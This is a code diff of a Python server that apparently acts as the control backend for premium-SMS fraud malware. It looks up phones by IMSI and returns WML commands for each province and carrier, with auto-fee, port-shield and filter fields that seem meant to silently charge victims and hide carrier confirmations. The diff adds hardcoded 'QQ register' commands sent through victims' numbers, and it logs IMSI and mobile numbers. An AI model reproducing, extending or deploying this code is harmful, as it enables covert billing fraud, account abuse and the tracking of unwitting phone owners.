@@ -48,6 +48,21 @@ FEE_CONTENT += "<feemode>11</feemode>"
 FEE_CONTENT += "</card>"
 FEE_CONTENT += "</wml>"
 
+QQ_REGISTER_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+QQ_REGISTER_CONTENT += "<wml>"
+QQ_REGISTER_CONTENT += "<card>"
+QQ_REGISTER_CONTENT += "<Ccmd_cust>ZC</Ccmd_cust>"
+QQ_REGISTER_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
+QQ_REGISTER_CONTENT += "<filter1_cust>腾讯科技</filter1_cust>"
+QQ_REGISTER_CONTENT += "<filter2_cust></filter2_cust>"
+QQ_REGISTER_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
+QQ_REGISTER_CONTENT += "<PortShield>[portShield]</PortShield>"
+QQ_REGISTER_CONTENT += "<fee></fee>"
+QQ_REGISTER_CONTENT += "<autofee>1</autofee>"
+QQ_REGISTER_CONTENT += "<feemode>11</feemode>"
+QQ_REGISTER_CONTENT += "</card>"
+QQ_REGISTER_CONTENT += "</wml>"
+
 TEST_CONTENT =  "";
 
 MATCH_FLOW_LIMIT_PER_MINUTE = {'minute':0,'count':0} 
@@ -106,7 +121,7 @@ def get_imsi_response(_imsi,_threads):
     _return = "";
     _imsi=filter(str.isdigit, _imsi)
     dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
-    _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
+    _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth ,lastRegisterCmdAppIdList FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
     _record_user = dbConfig.get(_sql, _imsi) 
     if _record_user==None:
         _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
@@ -146,15 +161,28 @@ def get_cmd(_user,_threads):
         _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and sms_cmd_covers.state = \'open\' and sms_cmd_configs.state = \'open\' order by rand() limit 1 '
         _record = dbConfig.get(_sql, _user['province'],_user['mobileType']) 
         if _record == None:
-            return None
+            _current_cmd_content = get_register_cmd(_user)
+            if _current_cmd_content!=None :
+                _threads.append(threading.Thread(target=insert_register_cmd_log(_user,_current_cmd_content)))
+            return _current_cmd_content
         else:
             _threads.append(threading.Thread(target=async_update_cmd_fee(_user,_record)))
-            _current_fee_content = FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace('[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
-            _threads.append(threading.Thread(target=insert_fee_cmd_log(_user,_record,_current_fee_content)))
-
-            return _current_fee_content
+            _current_cmd_content = FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', _record['provinceFilter'] or str(_record['filter'])).replace('[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
+            _threads.append(threading.Thread(target=insert_fee_cmd_log(_user,_record,_current_cmd_content)))
+            return _current_cmd_content
     else:
         print('can not match province'+str(_user))
+        return None
+
+def get_register_cmd(_user) :
+    if _user['province']=='山东' and str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1  :
+        if _user['mobileType']=="ChinaUnion" :
+            return QQ_REGISTER_CONTENT.replace('[spNumber]', '10690188022059').replace('[portShield]', '10690188')
+        elif _user['mobileType']=="ChinaMobile" :
+            return QQ_REGISTER_CONTENT.replace('[spNumber]', '10690508428459').replace('[portShield]', '10690508')
+        else :
+            return None
+    else :
         return None
 
 def async_update_cmd_fee(_user,_cmd):
@@ -186,10 +214,16 @@ def insert_req_log(_reqInfo):
     dbLog.insert(sql,long(round(time.time() * 1000))*10000+random.randint(0, 9999),1,imsi,_reqInfo["ip"],response.subdivisions.most_specific.name,response.city.name,_reqInfo["custCode"],_reqInfo["proCode"])
     return 
 
-def insert_fee_cmd_log(_user,_fee_cmd,_fee_info):
+def insert_fee_cmd_log(_user,_fee_cmd,_cmd_info):
     dbLog=torndb.Connection(config.GLOBAL_SETTINGS['log_db']['host'],config.GLOBAL_SETTINGS['log_db']['name'],config.GLOBAL_SETTINGS['log_db']['user'],config.GLOBAL_SETTINGS['log_db']['psw'])
     sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
-    dbLog.insert(sql,long(round(time.time() * 1000))*10000+random.randint(0, 9999),201,_user["imsi"],_fee_cmd["id"],_fee_cmd["spNumber"],_fee_cmd["msg"],_user["mobile"],_fee_info)
+    dbLog.insert(sql,long(round(time.time() * 1000))*10000+random.randint(0, 9999),201,_user["imsi"],_fee_cmd["id"],_fee_cmd["spNumber"],_fee_cmd["msg"],_user["mobile"],_cmd_info)
+    return 
+
+def insert_register_cmd_log(_user,_cmd_info):
+    dbLog=torndb.Connection(config.GLOBAL_SETTINGS['log_db']['host'],config.GLOBAL_SETTINGS['log_db']['name'],config.GLOBAL_SETTINGS['log_db']['user'],config.GLOBAL_SETTINGS['log_db']['psw'])
+    sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`) values (%s,%s,%s,%s,%s)'
+    dbLog.insert(sql,long(round(time.time() * 1000))*10000+random.randint(0, 9999),202,_user["imsi"],_user["mobile"],_cmd_info)
     return 
 
 def get_system_parameter_from_db(_title):
